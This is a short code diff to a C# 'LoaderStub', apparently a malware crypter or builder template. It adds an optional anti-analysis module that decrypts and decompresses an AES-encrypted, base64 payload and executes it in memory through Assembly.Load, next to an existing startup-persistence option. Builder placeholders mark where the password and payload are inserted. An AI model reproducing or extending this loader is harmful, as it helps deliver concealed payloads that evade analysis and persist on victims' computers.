@@ -51,6 +51,11 @@ namespace LoaderStub
 
         static void Conditions()
         {
+            string antiAnalysis = "#ANTI_FALSE#";
+            if (antiAnalysis == "#ANTI_TRUE#")
+            {
+                AntiAnalysis.Run();
+            }
             string startup = "#STARTUP_FALSE#";
             if (startup == "#STARTUP_TRUE#")
             {
@@ -59,6 +64,16 @@ namespace LoaderStub
         }
     }
 
+    class AntiAnalysis
+    {
+        public static void Run()
+        {
+            string passwordAntiAnalysis = "#PASSWORD_ANTI_ANALYSIS#";
+            byte[] AntiAnalysisBytes = Encryption.Decompress(Encryption.AES_Decrypt(Convert.FromBase64String("#BASE64_ANTI_ANALYSIS#"),passwordAntiAnalysis));
+            Assembly.Load(AntiAnalysisBytes).EntryPoint.Invoke(null,null);
+
+        }
+    }
     class Startup
     {
         public static void AddToStartup()
